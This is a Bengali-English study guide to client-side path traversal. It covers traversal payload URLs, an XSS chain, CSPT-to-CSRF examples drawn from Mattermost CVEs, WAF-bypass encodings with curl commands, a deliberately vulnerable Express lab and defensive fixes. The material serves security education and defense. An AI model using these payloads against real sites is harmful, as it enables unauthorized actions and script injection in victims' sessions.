# 🔀 Client-Side Path Traversal (CSPT) — Detailed Study Notes

> **Source:** [PayloadsAllTheThings/Client Side Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Path%20Traversal)
> **Also Known As:** "On-site Request Forgery"
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — CSPT কী?](#1-concept--cspt-কী)
2. [CSPT vs Server-Side Path Traversal — পার্থক্য](#2-cspt-vs-server-side-path-traversal--পার্থক্য)
3. [CSPT কীভাবে কাজ করে — Step by Step](#3-cspt-কীভাবে-কাজ-করে--step-by-step)
4. [Source এবং Sink — দুটো Key Concept](#4-source-এবং-sink--দুটো-key-concept)
5. [CSPT → XSS Attack](#5-cspt--xss-attack)
6. [CSPT → CSRF Attack (CSPT2CSRF)](#6-cspt--csrf-attack-cspt2csrf)
7. [CSPT vs Traditional CSRF Comparison](#7-cspt-vs-traditional-csrf-comparison)
8. [Real-World CVE Analysis](#8-real-world-cve-analysis)
9. [WAF Bypass — Encoding Levels](#9-waf-bypass--encoding-levels)
10. [Practical Lab Setup](#10-practical-lab-setup)
11. [Testing Methodology — কীভাবে Find করবে?](#11-testing-methodology--কীভাবে-find-করবে)
12. [Defense — Prevention](#12-defense--prevention)
13. [References](#13-references)

---

## 1. Concept — CSPT কী?

**Client-Side Path Traversal (CSPT)** হলো এমন একটা vulnerability যেখানে:

1. Frontend JavaScript code `fetch()` বা `XMLHttpRequest` দিয়ে কোনো URL এ request পাঠায়
2. সেই URL এ **attacker-controlled input** আছে (query parameter থেকে)
3. Input properly encode করা হয় না
4. Attacker `../` inject করে request কে **ভিন্ন endpoint** এ redirect করতে পারে
5. Browser automatically **cookies + auth tokens** সাথে দেয় (authenticated request!)

```
Core Idea:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  Frontend code:                                              │
│    const id = getQueryParam('newsitemid');  ← user input     │
│    fetch('/api/news/' + id);               ← URL তৈরি করে   │
│                                                              │
│  Normal usage:                                               │
│    URL: /page?newsitemid=123                                  │
│    fetch('/api/news/123')  ✅                                │
│                                                              │
│  CSPT Attack:                                                │
│    URL: /page?newsitemid=../../../admin/delete               │
│    fetch('/api/news/../../../admin/delete')                  │
│         ↓ path normalization                                 │
│    fetch('/admin/delete')  ← different endpoint!  ⚠️        │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

**কেন এটা dangerous?**

Browser যখন এই fetch করে, সে automatically:

- Session cookies পাঠায়
- Authentication headers পাঠায়
- CSRF tokens (যদি frontend add করে) পাঠায়

তার মানে এটা **authenticated request** — victim এর identity তে!

---

## 2. CSPT vs Server-Side Path Traversal — পার্থক্য

```
┌──────────────────────┬────────────────────────────┬────────────────────────────┐
│ Feature              │ Server-Side Path Traversal  │ Client-Side Path Traversal  │
├──────────────────────┼────────────────────────────┼────────────────────────────┤
│ Where it happens     │ Server এ                   │ Browser/Client এ           │
│ What it accesses     │ File system                │ API endpoints              │
│ Example              │ ../../../../etc/passwd      │ ../../../admin/delete      │
│ Target               │ Files on server             │ Different API endpoint     │
│ Auth context         │ Server এর own access        │ Victim user এর session     │
│ Tool                 │ curl, direct HTTP           │ Browser fetch() call       │
│ Cookies sent?        │ N/A                        │ ✅ Automatically            │
│ CSRF token bypass?   │ N/A                        │ ✅ Yes (if frontend adds)  │
└──────────────────────┴────────────────────────────┴────────────────────────────┘
```

```
Server-Side Example:
  GET /download?file=../../../../etc/passwd
  → Server reads file from disk: /etc/passwd
  → Server returns file contents

Client-Side (CSPT) Example:
  /page?id=../../../api/admin/delete
  → Browser JavaScript: fetch('/api/items/' + id)
  → Becomes: fetch('/api/items/../../../api/admin/delete')
  → Normalized: fetch('/api/admin/delete')
  → Victim এর cookie সহ DELETE request যায়!
```

---

## 3. CSPT কীভাবে কাজ করে — Step by Step

### Path Normalization বোঝো

```
Browser এবং server URL path normalize করে:

/api/news/../../../admin/delete
        ↓ normalize
/admin/delete

কারণ:
  /api/news/    → current directory
  ../           → এক level up → /api/
  ../           → আরেক level up → /
  ../           → আরেক level up → / (root)
  admin/delete  → /admin/delete
```

### Complete Attack Flow

```
Step 1: Vulnerable page খোঁজো
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  URL: https://example.com/news?id=123

  Frontend JavaScript:
    const newsId = new URLSearchParams(window.location.search).get('id');
    fetch('/api/news/' + newsId)     ← unsanitized input!
      .then(r => r.json())
      .then(data => renderNews(data));

Step 2: Normal request:
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  id=123
  fetch('/api/news/123')  → GET /api/news/123

Step 3: CSPT injection:
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  id=../users/admin/promote
  fetch('/api/news/../users/admin/promote')
       ↓ normalize
  fetch('/api/users/admin/promote')
  → POST এই endpoint এ victim এর cookie সহ!

Step 4: Browser sends:
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  GET /api/users/admin/promote
  Cookie: session=victim_session_token  ← automatically!
  X-CSRF-Token: abc123                  ← frontend add করলে!
```

---

## 4. Source এবং Sink — দুটো Key Concept

CSPT বুঝতে হলে **Source** এবং **Sink** concept টা জানতে হবে।

```
SOURCE: কোথা থেকে attacker input দিতে পারে
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ URL query parameters (?id=, ?item=, ?path=)
  ✅ URL hash (#section)
  ✅ URL path segments (/page/USER_INPUT/details)
  ✅ localStorage / sessionStorage
  ✅ PostMessage data
  ✅ Cookie values (যদি JS পড়তে পারে)

SINK: কোথায় সেই input use হচ্ছে (dangerous function)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ fetch('/api/' + userInput)
  ✅ axios.get('/endpoint/' + userInput)
  ✅ XMLHttpRequest.open('GET', '/path/' + userInput)
  ✅ $.ajax({ url: '/data/' + userInput })
  ✅ new URL(userInput, window.location)
```

```
Vulnerable Code Pattern:
  ┌─────────────────────────────────────────────────────┐
  │                                                     │
  │  SOURCE                    SINK                     │
  │    ↓                         ↓                      │
  │  const id = params.get('id');                       │
  │  fetch('/api/items/' + id);  ← PATH INJECTION HERE  │
  │                                                     │
  │  No encoding = VULNERABLE!                          │
  │                                                     │
  └─────────────────────────────────────────────────────┘

Safe Code Pattern:
  ┌─────────────────────────────────────────────────────┐
  │                                                     │
  │  const id = params.get('id');                       │
  │  const safeId = encodeURIComponent(id);  ← ENCODE!  │
  │  fetch('/api/items/' + safeId);                     │
  │                                                     │
  │  ../  →  ..%2F  (not interpreted as path separator) │
  │                                                     │
  └─────────────────────────────────────────────────────┘
```

---

## 5. CSPT → XSS Attack

### Example Walkthrough (PayloadsAllTheThings এর example)

```
Setup:
  Page:    https://example.com/static/cms/news.html
  Feature: newsitemid parameter নিয়ে news content fetch করে

  Frontend code:
    const newsId = params.get('newsitemid');
    fetch('https://example.com/newitems/' + newsId)
      .then(r => r.text())
      .then(content => {
        document.getElementById('news-body').innerHTML = content;
        // ↑ innerHTML এ response render করছে → XSS possible!
      });

Discovery:
  Step 1: Normal request:
    /news.html?newsitemid=123
    → fetch('/newitems/123')

  Step 2: CSPT possible? Test করো:
    /news.html?newsitemid=../pricing/default.js
    → fetch('/newitems/../pricing/default.js')
    → fetch('/pricing/default.js')  ← different endpoint!

  Step 3: Text injection found at /pricing/default.js via ?cb= parameter:
    /pricing/default.js?cb=INJECTED_TEXT
    → Response এ cb এর value reflect হয়

Chain করো:
  CSPT + Text Injection = XSS!

Final Payload:
  /news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
              ↓
  fetch('/newitems/../pricing/default.js?cb=alert(document.domain)//')
              ↓ normalize
  fetch('/pricing/default.js?cb=alert(document.domain)//')
              ↓ server reflects cb value
  Response: alert(document.domain)// <rest of js>
              ↓ innerHTML এ inject হলো
  XSS triggered!
```

```
Attack Chain Diagram:
┌────────────────────────────────────────────────────────────────┐
│                                                                │
│  Attacker crafts URL:                                          │
│  /news.html?newsitemid=../pricing/default.js?cb=alert(1)//    │
│                                                                │
│  Victim visits the URL                                         │
│         ↓                                                      │
│  Frontend extracts newsitemid parameter                        │
│         ↓                                                      │
│  fetch('/newitems/' + newsitemid)                              │
│  = fetch('/newitems/../pricing/default.js?cb=alert(1)//')      │
│         ↓ path normalization                                   │
│  fetch('/pricing/default.js?cb=alert(1)//')                   │
│         ↓ server responds (reflects cb value)                  │
│  Response: "alert(1)//<rest of script>"                        │
│         ↓                                                      │
│  innerHTML = response  → XSS!  alert(1) triggers!             │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

---

## 6. CSPT → CSRF Attack (CSPT2CSRF)

এটা CSPT এর সবচেয়ে powerful use case। Traditional CSRF এর limitations কে bypass করে।

### Traditional CSRF এর Problem

```
Traditional CSRF:
  Attacker এর page থেকে victim এর site এ request পাঠাতে চাই।

  Problem 1: SameSite=Lax cookie → cross-site request এ cookie যায় না
  Problem 2: Anti-CSRF token → attacker জানে না token কী
  Problem 3: শুধু GET/POST, body control করা কঠিন
```

### CSPT2CSRF কেন better?

```
CSPT2CSRF এর advantage:
  ✅ Request same site থেকে আসছে (victim এর browser)
  ✅ Browser নিজেই cookies add করে (SameSite bypass!)
  ✅ Frontend CSRF token add করে → CSRF protection bypass!
  ✅ GET, POST, PUT, PATCH, DELETE সব HTTP methods
  ✅ 1-click attack (victim শুধু link এ click করে)
```

### CSPT2CSRF Attack Flow

```
Scenario:
  App এ একটা feature আছে: comment এ mention করলে notification যায়
  Frontend code:
    const mentionId = params.get('mention');
    // Adds CSRF token automatically!
    fetch('/api/notifications/' + mentionId, {
      method: 'POST',
      headers: {
        'X-CSRF-Token': getCSRFToken()  ← automatically adds!
      }
    });

Attack:
  mentionId = ../../admin/promote-user?userId=attacker

  fetch('/api/notifications/../../admin/promote-user?userId=attacker')
       ↓ normalize
  POST /api/admin/promote-user?userId=attacker
  Headers: X-CSRF-Token: victim_csrf_token  ← bypass!
  Cookie: session=victim_session            ← bypass SameSite!

Result: Victim unknowingly promotes attacker to admin!
```

### Real Example — Mattermost CVE-2023-45316

```
Vulnerable URL:
  /<team>/channels/channelname?telem_action=under_control&telem_run_id=../../../../../../api/v4/caches/invalidate

Breakdown:
  Parameter:  telem_run_id
  Value:      ../../../../../../api/v4/caches/invalidate

  Frontend fetch:
    fetch('/api/telemetry/' + telem_run_id)
    = fetch('/api/telemetry/../../../../../../api/v4/caches/invalidate')
    ↓ normalize
    = fetch('/api/v4/caches/invalidate')

  This endpoint requires auth → frontend adds auth token automatically!
  Result: Attacker can invalidate ALL caches via victim's session!
```

---

## 7. CSPT vs Traditional CSRF Comparison

```
┌─────────────────────────────────┬────────────┬────────────────┐
│ Capability                      │ CSRF       │ CSPT2CSRF      │
├─────────────────────────────────┼────────────┼────────────────┤
│ POST request করা                │ ✅ Yes     │ ✅ Yes         │
│ Request body control করা        │ ✅ Yes     │ ❌ No          │
│ Anti-CSRF token bypass          │ ❌ No      │ ✅ Yes         │
│ SameSite=Lax bypass             │ ❌ No      │ ✅ Yes         │
│ GET/PATCH/PUT/DELETE            │ ❌ Limited │ ✅ Yes         │
│ 1-click attack                  │ ❌ No      │ ✅ Yes         │
│ Impact depends on source+sink   │ ❌ No      │ ✅ Yes         │
└─────────────────────────────────┴────────────┴────────────────┘
```

**Body control limitation ব্যাখ্যা:**

```
Traditional CSRF:
  Attacker body control করতে পারে:
  <form action="https://victim.com/transfer" method="POST">
    <input name="amount" value="1000">  ← attacker controls this
    <input name="to" value="attacker_account">
  </form>

CSPT2CSRF:
  Body control নেই কারণ legitimate frontend code এর body ব্যবহার হয়।
  কিন্তু URL parameters দিয়ে কিছুটা control possible:
  fetch('/api/action' + csptPayload + '?extra=attacker_value')
```

---

## 8. Real-World CVE Analysis

### CVE-2023-45316 — Mattermost (POST sink)

```
Vulnerability: telem_run_id parameter এ CSPT
Sink: POST request to /api/v4/caches/invalidate
Impact: Authenticated cache invalidation via victim's session

Payload URL:
  /<team>/channels/channelname
    ?telem_action=under_control
    &forceRHSOpen
    &telem_run_id=../../../../../../api/v4/caches/invalidate

CVSS: High
Fixed: Mattermost 7.8.10, 7.10.5, 8.0.1
```

### CVE-2023-6458 — Mattermost (GET sink)

```
Vulnerability: Similar CSPT but with GET request
Impact: Information disclosure via redirected fetch
Sink: GET request to unintended endpoint
```

### CVE-2023-5123 — Grafana JSON API Plugin

```
Vulnerability: CSPT in Grafana's JSON API datasource plugin
Sink: API request URL construction
Impact: SSRF-like behavior + potential CSRF
Reference: https://medium.com/@maxime.escourbiac/grafana-cve-2023-5123-write-up-74e1be7ef652
```

### Jupyter Notebook — CVE-2023-39968 + CVE-2024-22421

```
Chained attack:
  CVE-2023-39968: CSPT in Jupyter
  CVE-2024-22421: Another CSPT
  + Chromium bug

  Combined: Leak Jupyter auth token to attacker!

  Auth token leak → Full Jupyter instance access
  → RCE (Remote Code Execution) possible!
```

### Invite Flow CSPT (Client Side Path Manipulation)

```
Vulnerable URL pattern:
  https://example.com/signup/invite
    ?email=foo%40bar.com
    &inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=

Breakdown:
  inviteCode = 123456789/../../../cards/{card-uuid}/cancel?a=

  Frontend fetch:
    fetch('/api/invites/' + inviteCode)
    = fetch('/api/invites/123456789/../../../cards/{uuid}/cancel?a=')
    ↓ normalize
    = fetch('/api/cards/{uuid}/cancel?a=')

  Result: Victim's card cancelled without their knowledge!
  (Frontend adds auth token automatically)
```

---

## 9. WAF Bypass — Encoding Levels

WAF (Web Application Firewall) অনেক সময় `../` block করে। তখন encoding ব্যবহার করো।

### Encoding Levels

```
Level 0 (Plain):
  ../
  (WAF blocks this easily)

Level 1 (URL encoded):
  ..%2F
  (%2F = / এর URL encoding)

Level 2 (Double encoded):
  ..%252F
  (%25 = % এর encoding, তারপর 2F)
  Server decode করে: ..%252F → ..%2F → ../

Level 3 (Unicode):
  ..%u002F   (IE এ কাজ করতো)
  ..%c0%af   (overlong UTF-8)

Level 4 (Mixed):
  ..%2f      (lowercase)
  .%2e/      (. encode করো)
  %2e%2e/    (.. দুটোই encode)
  %2e%2e%2f  (সব encode)
```

```bash
# Testing different encoding levels with curl:

# Level 0
curl "https://target.com/page?id=../admin"

# Level 1
curl "https://target.com/page?id=..%2Fadmin"

# Level 2
curl "https://target.com/page?id=..%252Fadmin"

# Mixed
curl "https://target.com/page?id=.%2e%2fadmin"
curl "https://target.com/page?id=%2e%2e%2fadmin"
```

### WAF Bypass Trick — Fragment/Query Split

```
WAF টা path এ ../  block করছে?

Trick: Query parameter এর মধ্যে inject করো:
  Normal: /page?id=../admin
  WAF blocks: ../

  Alternative:
  /page?id=..%2fadmin          # encoded slash
  /page?id=....//admin         # double dot trick
  /page?id=..;/admin           # semicolon (some servers)
```

---

## 10. Practical Lab Setup

### Lab 1: CSPTPlayground (Official Lab)

```bash
# doyensec/CSPTPlayground — official CSPT practice environment
git clone https://github.com/doyensec/CSPTPlayground
cd CSPTPlayground

# Docker দিয়ে চালাও:
docker-compose up -d

# Browser এ: http://localhost:3000
# Multiple CSPT challenges আছে different difficulty তে
```

### Lab 2: নিজে বানাও — Vulnerable Express App

```bash
mkdir cspt-lab && cd cspt-lab
npm init -y
npm install express

cat > server.js << 'EOF'
const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Sensitive endpoint
app.get('/api/admin/users', (req, res) => {
  res.json({
    users: [
      { id: 1, name: 'admin', role: 'ADMIN', email: 'admin@company.com' },
      { id: 2, name: 'john', role: 'USER', email: 'john@company.com' }
    ]
  });
});

// Normal news endpoint
app.get('/api/news/:id', (req, res) => {
  const newsId = req.params.id;
  res.json({ id: newsId, title: `News ${newsId}`, content: 'Lorem ipsum...' });
});

app.listen(3000, () => console.log('CSPT Lab: http://localhost:3000'));
EOF

mkdir public
cat > public/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>CSPT Vulnerable News Site</title></head>
<body>
  <h1>Latest News</h1>
  <div id="news-content">Loading...</div>

  <script>
    // VULNERABLE: unsanitized URL parameter in fetch path
    const params = new URLSearchParams(window.location.search);
    const newsId = params.get('id') || '1';

    // BUG: newsId directly appended to URL without encoding!
    fetch('/api/news/' + newsId)
      .then(r => r.json())
      .then(data => {
        document.getElementById('news-content').innerHTML =
          '<h2>' + data.title + '</h2><p>' + data.content + '</p>';
      })
      .catch(e => {
        document.getElementById('news-content').innerHTML =
          'Error: ' + e.message;
      });
  </script>
</body>
</html>
EOF

node server.js
EOF
```

```bash
# Test করো:

# Normal:
curl "http://localhost:3000/api/news/1"
# Result: {"id":"1","title":"News 1","content":"Lorem ipsum..."}

# CSPT Attack:
# Browser এ visit করো:
# http://localhost:3000/?id=../admin/users
# Frontend fetches: /api/news/../admin/users → /api/admin/users
# Sensitive admin data expose হবে!

# আরো test:
open "http://localhost:3000/?id=../admin/users"
```

### Lab 3: Burp Suite Extension দিয়ে Find করো

```
CSPT Burp Extension install:
  1. Burp Suite → Extensions → BApp Store
  2. Search: "CSPT"
  3. Install: doyensec/CSPTBurpExtension

Usage:
  1. Target site browse করো (Burp proxy এর through)
  2. Extension automatically JavaScript analyze করে
  3. Potential CSPT sources ও sinks identify করে
  4. Report দেখো → manual verify করো
```

### Lab 4: Root Me Challenge

```
URL: https://www.root-me.org/en/Challenges/Web-Client/CSPT-The-Ruler
Difficulty: Medium
Concept: CSPT to manipulate fetch request destination
```

---

## 11. Testing Methodology — কীভাবে Find করবে?

### Step 1: JavaScript Source Code Analysis

```javascript
// Browser DevTools → Sources → JavaScript files খোঁজো
// এই patterns খোঁজো:

// Pattern 1: fetch with URL concatenation
fetch('/api/' + userControlledVar)
fetch(`/api/${userControlledVar}`)
fetch('/api/'.concat(userControlledVar))

// Pattern 2: axios
axios.get('/endpoint/' + param)
axios.post('/path/' + param, body)

// Pattern 3: XMLHttpRequest
xhr.open('GET', '/api/' + param)

// Pattern 4: jQuery
$.get('/data/' + param)
$.ajax({ url: '/endpoint/' + param })
```

```bash
# Browser console দিয়ে automatically search করো:
# DevTools → Console:

// All fetch calls monitor করো
const originalFetch = window.fetch;
window.fetch = function(url, options) {
  console.log('FETCH:', url, options);
  return originalFetch.apply(this, arguments);
};

// এখন সাইট navigate করো এবং console এ fetch URLs দেখো
// যেগুলো URL parameter থেকে আসছে সেগুলো CSPT candidate
```

### Step 2: Source Identification

```
URL parameters যেগুলো API call এ use হয় সেগুলো খোঁজো:

Common vulnerable parameter names:
  ✅ id, item, path, resource, file
  ✅ section, page, view, tab
  ✅ endpoint, api, url, src
  ✅ category, type, format
  ✅ ref, redirect, next

Test each with:
  originalValue → ../test
  originalValue → ../../test
  originalValue → ../../../test
```

### Step 3: Sink Identification

```
Network tab এ watch করো:
  1. Browser DevTools → Network tab open করো
  2. Page visit করো normal parameter দিয়ে
  3. কোন API calls হচ্ছে দেখো
  4. কোন call এ URL এ parameter value আছে দেখো
  5. সেই call টা CSPT sink candidate

Example:
  Normal: /news?id=123 → API call: GET /api/news/123
  Modified: /news?id=../admin → API call: GET /api/admin
  Confirmed CSPT!
```

### Step 4: Exploitation Planning

```
CSPT confirm হওয়ার পরে:

Question 1: HTTP method কী?
  GET sink  → CSPT2CSRF for GET-based actions
  POST sink → CSPT2CSRF for POST-based actions

Question 2: কোন endpoints আছে?
  /api/admin/* → privilege escalation
  /api/account/delete → account deletion
  /api/payment/* → financial actions

Question 3: Frontend কি token add করে?
  X-CSRF-Token? → CSRF bypass
  Authorization header? → Auth bypass

Question 4: XSS possible?
  Response কি innerHTML এ যায়?
  Response body তে XSS injection possible?
```

---

## 12. Defense — Prevention

### ✅ Fix 1: encodeURIComponent() ব্যবহার করো

```javascript
// ❌ VULNERABLE:
const id = params.get('id')
fetch('/api/news/' + id)

// ✅ SAFE:
const id = params.get('id')
const safeId = encodeURIComponent(id)
// ../  →  ..%2F  (/ encode হয়ে যায়, path separator হিসেবে কাজ করে না)
fetch('/api/news/' + safeId)
```

### ✅ Fix 2: Allowlist Validation

```javascript
// ❌ VULNERABLE:
const newsId = params.get('id')
fetch('/api/news/' + newsId)

// ✅ SAFE: Allowlist দিয়ে validate করো
const newsId = params.get('id')

// শুধু numeric ID allow করো
if (!/^\d+$/.test(newsId)) {
  throw new Error('Invalid news ID')
}

fetch('/api/news/' + newsId)
```

### ✅ Fix 3: URL Object ব্যবহার করো

```javascript
// ✅ SAFE: URL object path traversal prevent করে
const newsId = params.get('id')
const baseUrl = new URL('/api/news/', window.location.origin)

// URL object ../  কে resolve করবে কিন্তু origin এর বাইরে যেতে দেবে না
const targetUrl = new URL(newsId, baseUrl)

// Check করো URL এখনো expected path এ আছে কিনা
if (!targetUrl.pathname.startsWith('/api/news/')) {
  throw new Error('Invalid path detected')
}

fetch(targetUrl.toString())
```

### ✅ Fix 4: Server-side Validation

```javascript
// Server side এও validate করো:

// Node.js/Express:
app.get('/api/news/:id', (req, res) => {
  const id = req.params.id

  // Numeric only validation
  if (!/^\d+$/.test(id)) {
    return res.status(400).json({ error: 'Invalid ID format' })
  }

  // Path traversal detection
  if (id.includes('..') || id.includes('/') || id.includes('\\')) {
    return res.status(400).json({ error: 'Invalid characters in ID' })
  }

  // Proceed with safe ID
  const news = getNewsById(parseInt(id))
  res.json(news)
})
```

### Defense Summary

```
Attack vector              → Fix
────────────────────────────────────────────────────────────
User input in fetch URL    → encodeURIComponent() always
Path traversal ../         → Allowlist validation (regex)
Unvalidated endpoint       → Server-side path validation
innerHTML with response    → textContent instead of innerHTML
                             (prevents XSS chain)
```

---

## 13. References

| Resource                           | Link                                                                                                       |
| ---------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings               | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Path%20Traversal) |
| CSPT2CSRF — Doyensec Blog          | [Blog Post](https://blog.doyensec.com/2024/07/02/cspt2csrf.html)                                           |
| CSPT Burp Extension                | [GitHub](https://github.com/doyensec/CSPTBurpExtension)                                                    |
| CSPTPlayground (Lab)               | [GitHub](https://github.com/doyensec/CSPTPlayground)                                                       |
| WAF Bypass via Encoding            | [Matan Berson](https://matanber.com/blog/cspt-levels)                                                      |
| Automating CSPT Discovery          | [Vitor Falcao](https://vitorfalcao.com/posts/automating-cspt-discovery/)                                   |
| Root Me CSPT Challenge             | [Root Me](https://www.root-me.org/en/Challenges/Web-Client/CSPT-The-Ruler)                                 |
| On-site Request Forgery (original) | [PortSwigger Blog](https://portswigger.net/blog/on-site-request-forgery)                                   |
| CVE-2023-45316                     | Mattermost CSPT2CSRF                                                                                       |
| Jupyter Token Leak CVE             | [XSS.am Blog](https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/)                              |

---

> ✅ **Next Topic Suggestions:**
>
> - `Cross-Site Request Forgery/README.md` — Traditional CSRF (CSPT এর সাথে compare করতে)
> - `Directory Traversal/README.md` — Server-side path traversal (CSPT এর server counterpart)
> - `XSS Injection/README.md` — XSS (CSPT2XSS chain এর দ্বিতীয় অংশ)
> - `CORS Misconfiguration/README.md` — Cross-origin attacks

> ⚠️ **Ethical Reminder:** CSPT testing শুধুমাত্র Bug Bounty program এর scope, authorized pentest, বা নিজের lab এ করো। Real applications এ unauthorized testing illegal।
